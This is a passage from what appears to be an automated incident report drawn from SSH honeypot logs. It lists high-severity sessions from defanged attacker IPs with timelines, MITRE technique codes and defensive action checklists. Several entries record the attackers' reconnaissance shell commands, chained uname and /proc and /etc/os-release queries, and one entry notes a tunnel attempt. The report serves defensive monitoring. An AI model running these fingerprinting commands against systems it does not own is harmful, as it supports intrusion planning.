- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19e4b56fbe64

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:06 |
| **Last Seen** | 2026-08-12 12:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:06:46` | `cowrie.session.connect` |
| `2026-08-12 12:06:46` | `cowrie.client.version` |
| `2026-08-12 12:06:46` | `cowrie.client.kex` |
| `2026-08-12 12:06:48` | `cowrie.login.success` |
| `2026-08-12 12:06:49` | `cowrie.session.params` |
| `2026-08-12 12:06:49` | `cowrie.command.input` |
| `2026-08-12 12:06:49` | `cowrie.command.input` |
| `2026-08-12 12:06:49` | `cowrie.command.input` |
| `2026-08-12 12:06:49` | `cowrie.command.input` |
| `2026-08-12 12:06:49` | `cowrie.command.input` |
| `2026-08-12 12:06:49` | `cowrie.command.success` |
| `2026-08-12 12:06:49` | `cowrie.command.input` |
| `2026-08-12 12:06:49` | `cowrie.command.input` |
| `2026-08-12 12:06:49` | `cowrie.command.input` |
| `2026-08-12 12:06:49` | `cowrie.command.input` |
| `2026-08-12 12:06:50` | `cowrie.log.closed` |
| `2026-08-12 12:06:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32111b30b678

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:08 |
| **Last Seen** | 2026-08-12 12:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:08:21` | `cowrie.session.connect` |
| `2026-08-12 12:08:21` | `cowrie.client.version` |
| `2026-08-12 12:08:21` | `cowrie.client.kex` |
| `2026-08-12 12:08:23` | `cowrie.login.success` |
| `2026-08-12 12:08:24` | `cowrie.session.params` |
| `2026-08-12 12:08:24` | `cowrie.command.input` |
| `2026-08-12 12:08:24` | `cowrie.command.input` |
| `2026-08-12 12:08:24` | `cowrie.command.input` |
| `2026-08-12 12:08:24` | `cowrie.command.input` |
| `2026-08-12 12:08:24` | `cowrie.command.input` |
| `2026-08-12 12:08:24` | `cowrie.command.success` |
| `2026-08-12 12:08:24` | `cowrie.command.input` |
| `2026-08-12 12:08:24` | `cowrie.command.input` |
| `2026-08-12 12:08:24` | `cowrie.command.input` |
| `2026-08-12 12:08:24` | `cowrie.command.input` |
| `2026-08-12 12:08:24` | `cowrie.log.closed` |
| `2026-08-12 12:08:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-745366363922

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:09 |
| **Last Seen** | 2026-08-12 12:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:09:55` | `cowrie.session.connect` |
| `2026-08-12 12:09:55` | `cowrie.client.version` |
| `2026-08-12 12:09:55` | `cowrie.client.kex` |
| `2026-08-12 12:09:58` | `cowrie.login.success` |
| `2026-08-12 12:09:59` | `cowrie.session.params` |
| `2026-08-12 12:09:59` | `cowrie.command.input` |
| `2026-08-12 12:09:59` | `cowrie.command.input` |
| `2026-08-12 12:09:59` | `cowrie.command.input` |
| `2026-08-12 12:09:59` | `cowrie.command.input` |
| `2026-08-12 12:09:59` | `cowrie.command.input` |
| `2026-08-12 12:09:59` | `cowrie.command.success` |
| `2026-08-12 12:09:59` | `cowrie.command.input` |
| `2026-08-12 12:09:59` | `cowrie.command.input` |
| `2026-08-12 12:09:59` | `cowrie.command.input` |
| `2026-08-12 12:09:59` | `cowrie.command.input` |
| `2026-08-12 12:09:59` | `cowrie.log.closed` |
| `2026-08-12 12:09:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ddb8df45459

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:11 |
| **Last Seen** | 2026-08-12 12:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:11:29` | `cowrie.session.connect` |
| `2026-08-12 12:11:29` | `cowrie.client.version` |
| `2026-08-12 12:11:29` | `cowrie.client.kex` |
| `2026-08-12 12:11:31` | `cowrie.login.success` |
| `2026-08-12 12:11:33` | `cowrie.session.params` |
| `2026-08-12 12:11:33` | `cowrie.command.input` |
| `2026-08-12 12:11:33` | `cowrie.command.input` |
| `2026-08-12 12:11:33` | `cowrie.command.input` |
| `2026-08-12 12:11:33` | `cowrie.command.input` |
| `2026-08-12 12:11:33` | `cowrie.command.input` |
| `2026-08-12 12:11:33` | `cowrie.command.success` |
| `2026-08-12 12:11:33` | `cowrie.command.input` |
| `2026-08-12 12:11:33` | `cowrie.command.input` |
| `2026-08-12 12:11:33` | `cowrie.command.input` |
| `2026-08-12 12:11:33` | `cowrie.command.input` |
| `2026-08-12 12:11:33` | `cowrie.log.closed` |
| `2026-08-12 12:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a93de8346d4a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:14 |
| **Last Seen** | 2026-08-12 12:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:14:28` | `cowrie.session.connect` |
| `2026-08-12 12:14:28` | `cowrie.client.version` |
| `2026-08-12 12:14:28` | `cowrie.client.kex` |
| `2026-08-12 12:14:29` | `cowrie.login.success` |
| `2026-08-12 12:14:30` | `cowrie.session.params` |
| `2026-08-12 12:14:30` | `cowrie.command.input` |
| `2026-08-12 12:14:30` | `cowrie.command.input` |
| `2026-08-12 12:14:30` | `cowrie.command.input` |
| `2026-08-12 12:14:30` | `cowrie.command.input` |
| `2026-08-12 12:14:30` | `cowrie.command.input` |
| `2026-08-12 12:14:30` | `cowrie.command.success` |
| `2026-08-12 12:14:30` | `cowrie.command.input` |
| `2026-08-12 12:14:30` | `cowrie.command.input` |
| `2026-08-12 12:14:30` | `cowrie.command.input` |
| `2026-08-12 12:14:30` | `cowrie.command.input` |
| `2026-08-12 12:14:30` | `cowrie.log.closed` |
| `2026-08-12 12:14:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-287de9957a97

| Field | Detail |
|---|---|
| **Source IP** | `183.6.64[.]180` |
| **First Seen** | 2026-08-12 12:14 |
| **Last Seen** | 2026-08-12 12:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `grep -c ^processor /proc/cpuinfo` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:14:44` | `cowrie.session.connect` |
| `2026-08-12 12:14:44` | `cowrie.client.version` |
| `2026-08-12 12:14:45` | `cowrie.client.kex` |
| `2026-08-12 12:14:46` | `cowrie.login.success` |
| `2026-08-12 12:14:47` | `cowrie.session.params` |
| `2026-08-12 12:14:47` | `cowrie.command.input` |
| `2026-08-12 12:14:47` | `cowrie.log.closed` |
| `2026-08-12 12:14:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.6.64[.]180` to AbuseIPDB if not already reported
- [ ] Block `183.6.64[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e654bc696c2

| Field | Detail |
|---|---|
| **Source IP** | `183.6.64[.]180` |
| **First Seen** | 2026-08-12 12:14 |
| **Last Seen** | 2026-08-12 12:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `grep -c ^processor /proc/cpuinfo` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:14:50` | `cowrie.session.connect` |
| `2026-08-12 12:14:50` | `cowrie.client.version` |
| `2026-08-12 12:14:50` | `cowrie.client.kex` |
| `2026-08-12 12:14:51` | `cowrie.login.success` |
| `2026-08-12 12:14:53` | `cowrie.session.params` |
| `2026-08-12 12:14:53` | `cowrie.command.input` |
| `2026-08-12 12:14:54` | `cowrie.log.closed` |
| `2026-08-12 12:14:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.6.64[.]180` to AbuseIPDB if not already reported
- [ ] Block `183.6.64[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b0f62a23fe6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:16 |
| **Last Seen** | 2026-08-12 12:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:16:02` | `cowrie.session.connect` |
| `2026-08-12 12:16:02` | `cowrie.client.version` |
| `2026-08-12 12:16:02` | `cowrie.client.kex` |
| `2026-08-12 12:16:04` | `cowrie.login.success` |
| `2026-08-12 12:16:05` | `cowrie.session.params` |
| `2026-08-12 12:16:05` | `cowrie.command.input` |
| `2026-08-12 12:16:05` | `cowrie.command.input` |
| `2026-08-12 12:16:05` | `cowrie.command.input` |
| `2026-08-12 12:16:05` | `cowrie.command.input` |
| `2026-08-12 12:16:05` | `cowrie.command.input` |
| `2026-08-12 12:16:05` | `cowrie.command.success` |
| `2026-08-12 12:16:05` | `cowrie.command.input` |
| `2026-08-12 12:16:05` | `cowrie.command.input` |
| `2026-08-12 12:16:05` | `cowrie.command.input` |
| `2026-08-12 12:16:05` | `cowrie.command.input` |
| `2026-08-12 12:16:05` | `cowrie.log.closed` |
| `2026-08-12 12:16:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff1688cda85b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-12 12:17 |
| **Last Seen** | 2026-08-12 12:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:17:04` | `cowrie.session.connect` |
| `2026-08-12 12:17:04` | `cowrie.client.version` |
| `2026-08-12 12:17:04` | `cowrie.client.kex` |
| `2026-08-12 12:17:05` | `cowrie.login.success` |
| `2026-08-12 12:17:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c93bd23260a

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-12 12:17 |
| **Last Seen** | 2026-08-12 12:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:17:05` | `cowrie.session.connect` |
| `2026-08-12 12:17:05` | `cowrie.client.version` |
| `2026-08-12 12:17:05` | `cowrie.client.kex` |
| `2026-08-12 12:17:05` | `cowrie.login.success` |
| `2026-08-12 12:17:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98e4389506ee

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:17 |
| **Last Seen** | 2026-08-12 12:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:17:33` | `cowrie.session.connect` |
| `2026-08-12 12:17:33` | `cowrie.client.version` |
| `2026-08-12 12:17:33` | `cowrie.client.kex` |
| `2026-08-12 12:17:34` | `cowrie.login.success` |
| `2026-08-12 12:17:36` | `cowrie.session.params` |
| `2026-08-12 12:17:36` | `cowrie.command.input` |
| `2026-08-12 12:17:36` | `cowrie.command.input` |
| `2026-08-12 12:17:36` | `cowrie.command.input` |
| `2026-08-12 12:17:36` | `cowrie.command.input` |
| `2026-08-12 12:17:36` | `cowrie.command.input` |
| `2026-08-12 12:17:36` | `cowrie.command.success` |
| `2026-08-12 12:17:36` | `cowrie.command.input` |
| `2026-08-12 12:17:36` | `cowrie.command.input` |
| `2026-08-12 12:17:36` | `cowrie.command.input` |
| `2026-08-12 12:17:36` | `cowrie.command.input` |
| `2026-08-12 12:17:36` | `cowrie.log.closed` |
| `2026-08-12 12:17:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07fa01ade596

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:19 |
| **Last Seen** | 2026-08-12 12:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:19:02` | `cowrie.session.connect` |
| `2026-08-12 12:19:02` | `cowrie.client.version` |
| `2026-08-12 12:19:03` | `cowrie.client.kex` |
| `2026-08-12 12:19:04` | `cowrie.login.success` |
| `2026-08-12 12:19:05` | `cowrie.session.params` |
| `2026-08-12 12:19:05` | `cowrie.command.input` |
| `2026-08-12 12:19:05` | `cowrie.command.input` |
| `2026-08-12 12:19:05` | `cowrie.command.input` |
| `2026-08-12 12:19:05` | `cowrie.command.input` |
| `2026-08-12 12:19:05` | `cowrie.command.input` |
| `2026-08-12 12:19:05` | `cowrie.command.success` |
| `2026-08-12 12:19:05` | `cowrie.command.input` |
| `2026-08-12 12:19:05` | `cowrie.command.input` |
| `2026-08-12 12:19:05` | `cowrie.command.input` |
| `2026-08-12 12:19:05` | `cowrie.command.input` |
| `2026-08-12 12:19:06` | `cowrie.log.closed` |
| `2026-08-12 12:19:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-085c9815bb1e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:20 |
| **Last Seen** | 2026-08-12 12:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:20:33` | `cowrie.session.connect` |
| `2026-08-12 12:20:33` | `cowrie.client.version` |
| `2026-08-12 12:20:33` | `cowrie.client.kex` |
| `2026-08-12 12:20:35` | `cowrie.login.success` |
| `2026-08-12 12:20:36` | `cowrie.session.params` |
| `2026-08-12 12:20:36` | `cowrie.command.input` |
| `2026-08-12 12:20:36` | `cowrie.command.input` |
| `2026-08-12 12:20:36` | `cowrie.command.input` |
| `2026-08-12 12:20:36` | `cowrie.command.input` |
| `2026-08-12 12:20:36` | `cowrie.command.input` |
| `2026-08-12 12:20:36` | `cowrie.command.success` |
| `2026-08-12 12:20:36` | `cowrie.command.input` |
| `2026-08-12 12:20:36` | `cowrie.command.input` |
| `2026-08-12 12:20:36` | `cowrie.command.input` |
| `2026-08-12 12:20:36` | `cowrie.command.input` |
| `2026-08-12 12:20:36` | `cowrie.log.closed` |
| `2026-08-12 12:20:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b73856fc6669

| Field | Detail |
|---|---|
| **Source IP** | `47.254.215[.]142` |
| **First Seen** | 2026-08-12 12:21 |
| **Last Seen** | 2026-08-12 12:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: curl/7.64.1, Accept: */*` |
| **TTPs (MITRE)** | T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:21:15` | `cowrie.session.connect` |
| `2026-08-12 12:21:15` | `cowrie.login.success` |
| `2026-08-12 12:21:15` | `cowrie.session.params` |
| `2026-08-12 12:21:15` | `cowrie.command.input` |
| `2026-08-12 12:21:15` | `cowrie.command.failed` |
| `2026-08-12 12:21:15` | `cowrie.command.input` |
| `2026-08-12 12:21:15` | `cowrie.command.failed` |
| `2026-08-12 12:21:15` | `cowrie.command.input` |
| `2026-08-12 12:21:18` | `cowrie.log.closed` |
| `2026-08-12 12:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.254.215[.]142` to AbuseIPDB if not already reported
- [ ] Block `47.254.215[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc1c449e7f80

| Field | Detail |
|---|---|
| **Source IP** | `74.119.147[.]213` |
| **First Seen** | 2026-08-12 12:21 |
| **Last Seen** | 2026-08-12 12:26 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 12:21:18` | `cowrie.session.connect` |
| `2026-08-12 12:21:18` | `cowrie.client.version` |
| `2026-08-12 12:21:18` | `cowrie.client.kex` |
| `2026-08-12 12:21:19` | `cowrie.login.success` |
| `2026-08-12 12:21:20` | `cowrie.direct-tcpip.request` |
| `2026-08-12 12:26:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.119.147[.]213` to AbuseIPDB if not already reported
- [ ] Block `74.119.147[.]213` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df810fbaa3a7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 12:22 |
| **Last Seen** | 2026-08-12 12:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
